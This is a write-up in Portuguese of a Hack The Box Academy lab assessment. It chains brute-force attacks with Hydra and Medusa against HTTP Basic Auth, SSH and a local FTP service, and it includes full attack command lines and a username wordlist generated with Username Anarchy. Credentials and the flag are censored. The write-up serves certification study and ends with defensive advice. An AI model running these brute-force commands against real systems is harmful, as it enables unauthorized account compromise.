# 🔓 Login Brute Forcing — Skills Assessment (Hack The Box Academy)

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Academy-9FEF00?style=flat&logo=hackthebox)
![Module](https://img.shields.io/badge/M%C3%B3dulo-Login%20Brute%20Forcing-red)
![Status](https://img.shields.io/badge/Status-Completo-success)
![Tools](https://img.shields.io/badge/Tools-Hydra%20%7C%20Medusa%20%7C%20Username%20Anarchy-orange)

> Write-up do Skills Assessment do módulo **Login Brute Forcing** da Hack The Box Academy, parte da trilha de estudos para as certificações **CWES e CPTS**.

---

## 📑 Sumário

- [Objetivo](#-objetivo)
- [Informações do Laboratório](#-informações-do-laboratório)
- [Parte 1 — Basic HTTP Authentication](#-parte-1--basic-http-authentication)
- [Parte 2 — SSH, Reconhecimento e FTP](#-parte-2--ssh-reconhecimento-e-ftp)
- [Fluxo de Exploração](#-fluxo-de-exploração)
- [Skills Praticadas](#-skills-praticadas)
- [Conclusão](#-conclusão)
- [Disclaimer Ético](#️-disclaimer-ético)

---

## 🎯 Objetivo

Aplicar de forma integrada os conceitos do módulo Password Security, Brute Force, Dictionary Attacks, Hydra, Medusa, Basic HTTP Authentication, Login Forms, SSH, FTP e Custom Wordlists para comprometer uma cadeia de serviços através de ataques de força bruta.

O assessment foi dividido em duas etapas:

1. Obter acesso a um serviço com **Basic HTTP Authentication** via **Hydra**.
2. Utilizar as credenciais obtidas para comprometer um servidor **SSH**, realizar reconhecimento interno, gerar uma wordlist customizada de usuários e comprometer um serviço **FTP**.

## 🖥️ Informações do Laboratório

| Item | Detalhe |
|---|---|
| Categoria | Brute Forcing |
| Plataforma | Hack The Box Academy |
| Módulo | Login Brute Forcing |
| Objetivo | Recuperar a flag final explorando múltiplos serviços |

> <img src="https://i.imgur.com/3piS6od.png"/>

---

## 🧩 Parte 1 — Basic HTTP Authentication

### Cenário

A primeira etapa exigia um ataque de força bruta contra um serviço protegido por **Basic HTTP Authentication**, com duas wordlists fornecidas via GitHub:

```bash
curl -O <URL>/usernames.txt
curl -O <URL>/passwords.txt
```

### Questão 1 — Senha do Basic Auth

Como o serviço utilizava Basic HTTP Authentication, apliquei o **Hydra** com ambas as wordlists como fonte de usuários e senhas:

```bash
hydra -L usernames.txt \
      -P passwords.txt \
      IP \
      http-get / \
      -s PORT
```

> <img src="https://i.imgur.com/Lu7Gfnh.png"/>

**Credenciais encontradas:**


![Password](https://img.shields.io/badge/Login-admin-green) <br>
![Password](https://img.shields.io/badge/Password-Censored-red)


Após autenticação, a aplicação retornou o usuário a ser usado na Parte 2:

```
Congratulations!
This is the username you will need for part 2 of the Skills Assessment
"USERNAME"
```

### Questão 2 — Usuário para a próxima etapa

A própria aplicação entregou o usuário na tela de sucesso.

**✅ Resposta:** `CENSORED`

---

## 🧩 Parte 2 — SSH, Reconhecimento e FTP

### Cenário

Com o usuário da segunda etapa em mãos, o objetivo era realizar brute force no login SSH da instância alvo.

### Descobrindo a senha do SSH

Como o usuário já era conhecido, bastava atacar a senha com o **Medusa**:

```bash
medusa \
  -h TARGET_IP \
  -u CENSORED \
  -P passwords.txt \
  -M ssh
```

> <img src="https://i.imgur.com/m1IrNei.png"/>

**Resultado:**

```
ACCOUNT FOUND:
Host: 154.57.xxx.xxx
User: CENSORED
Password: CENSORED
[SUCCESS]
```

### Acesso via SSH

```bash
ssh CENSORED@TARGET_IP
# senha: CENSORED
```

### Reconhecimento Inicial

```bash
ls
```

```
IncidentReport.txt
passwords.txt
username-anarchy
```

Três artefatos chamaram atenção: um relatório de incidente, uma wordlist de senhas e a ferramenta **Username Anarchy**, sinal claro de que o próximo alvo exigiria uma wordlist de usuários customizada.

### Analisando o Incident Report

```bash
cat IncidentReport.txt
```

O relatório apontava atividade suspeita de FTP associada a um usuário nomeado **CENSORED Smith**, a peça que faltava para montar o ataque seguinte.

> <img src="https://i.imgur.com/YkR74HP.png"/>

### Gerando possíveis usuários com Username Anarchy

```bash
./username-anarchy CENSORED Smith > list.txt
```

A ferramenta gerou dezenas de convenções de nome de usuário a partir do nome completo.

### Ataque ao servidor FTP

Com o FTP hospedado localmente na máquina já comprometida, o Medusa foi utilizado novamente, agora combinando a wordlist de usuários gerada com a wordlist de senhas encontrada anteriormente:

```bash
medusa \
  -h 127.0.0.1 \
  -U list.txt \
  -P ../passwords.txt \
  -M ftp \
  -t 5
```

> <img src="https://i.imgur.com/89mKX5L.png"/>

**Resultado:**

```
ACCOUNT FOUND:
Host: 127.0.0.1
User: CENSORED
Password: CENSORED
[SUCCESS]
```

### Login no FTP e captura da flag

```bash
ftp ftp://CENSORED@localhost
# senha: CENSORED
```

```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

```bash
ls
get flag.txt
exit
```

```bash
cat flag.txt
```

> <img src="https://i.imgur.com/i2KqdPs.png"/>

**🚩 Flag:** `HTB{CENSORED}`

---

## 🔗 Fluxo de Exploração

```
Basic HTTP Authentication
        │
        ▼
Brute Force com Hydra
        │
        ▼
Credenciais Admin
        │
        ▼
Descoberta do usuário
        │
        ▼
Brute Force SSH com Medusa
        │
        ▼
Acesso à máquina
        │
        ▼
Reconhecimento interno
        │
        ▼
IncidentReport.txt → nome "CENSORED Smith"
        │
        ▼
Username Anarchy → wordlist de usuários
        │
        ▼
Brute Force FTP com Medusa
        │
        ▼
Credenciais FTP → Download da flag
```

---

## 🛠️ Skills Praticadas

- Fundamentos de segurança de senhas e ataques de dicionário
- Brute force contra Basic HTTP Authentication
- Uso avançado de **Hydra** e **Medusa** em múltiplos protocolos (HTTP, SSH, FTP)
- Reconhecimento pós-exploração em ambiente Linux
- Extração de inteligência a partir de artefatos (incident reports)
- Geração de wordlists customizadas com **Username Anarchy**
- Encadeamento de vulnerabilidades entre serviços distintos

---

## 🏁 Conclusão

Este Skills Assessment reforça que ataques de força bruta eficazes raramente dependem apenas de wordlists genéricas. A cadeia de exploração combinou reconhecimento, análise de artefatos e personalização de credenciais: o acesso inicial via Basic HTTP Authentication revelou um usuário válido para o SSH; o SSH, por sua vez, expôs um incident report que apontava um nome real, transformado em wordlist de usuários pelo Username Anarchy; e essa wordlist, combinada com as senhas já conhecidas, comprometeu o FTP e liberou a flag final.

O exercício evidencia a importância prática de senhas fortes e únicas, bloqueio por tentativas, monitoramento de acessos e autenticação multifator como camadas de defesa contra esse tipo de ataque.

---

## ⚠️ Disclaimer Ético

Este write-up documenta atividades realizadas exclusivamente em ambiente de laboratório controlado da **Hack The Box Academy**, com fins educacionais, como parte da preparação para as certificações **CWEs e CPTS**. Nenhuma técnica aqui descrita deve ser aplicada contra sistemas, redes ou aplicações sem autorização explícita. O uso indevido dessas técnicas pode configurar crime.
